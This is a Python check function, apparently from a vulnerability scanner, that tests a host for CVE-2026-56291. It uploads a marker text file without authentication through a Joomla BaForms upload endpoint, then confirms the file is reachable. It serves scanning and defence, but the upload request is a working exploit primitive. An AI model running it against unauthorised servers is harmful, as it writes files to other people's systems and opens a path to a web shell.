import requests
import random
import string
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2026_56291(ip, ports=None, timeout=5):
    marker = ''.join(random.choices(string.ascii_lowercase, k=8))
    filename = f"{marker}.txt"
    content = f"CVE-2026-56291-{marker}"

    headers = {"User-Agent": user_agents()}

    protocols = ["http", "https"]
    if ports is None:
        ports = [80, 443]
    port_strings = [f":{port}" for port in ports]

    upload_path = "/index.php?option=com_baforms&task=form.uploadAttachmentFile&form_id=1"
    verify_path = f"/images/baforms/uploads/form-0/{filename}"

    for protocol in protocols:
        for port_str in port_strings:
            base_url = f"{protocol}://{ip}{port_str}"
            upload_url = base_url + upload_path

            try:
                files = {
                    'form_id': (None, '1'),
                    'file': (filename, content, 'text/plain')
                }
                upload_headers = headers.copy()
                upload_headers['Host'] = ip

                upload_resp = requests.post(
                    upload_url,
                    files=files,
                    headers=upload_headers,
                    verify=False,
                    timeout=timeout,
                    allow_redirects=True
                )

                if upload_resp.status_code != 200:
                    continue

                verify_url = base_url + verify_path
                verify_headers = headers.copy()
                verify_headers['Host'] = ip

                verify_resp = requests.get(
                    verify_url,
                    headers=verify_headers,
                    verify=False,
                    timeout=timeout,
                    allow_redirects=True
                )

                if verify_resp.status_code == 200 and content in verify_resp.text:
                    print_colour(f"CVE-2026-56291 vulnerable: {upload_url} (file {filename} uploaded and accessible)")
                    return True

            except requests.RequestException:
                continue

    return False
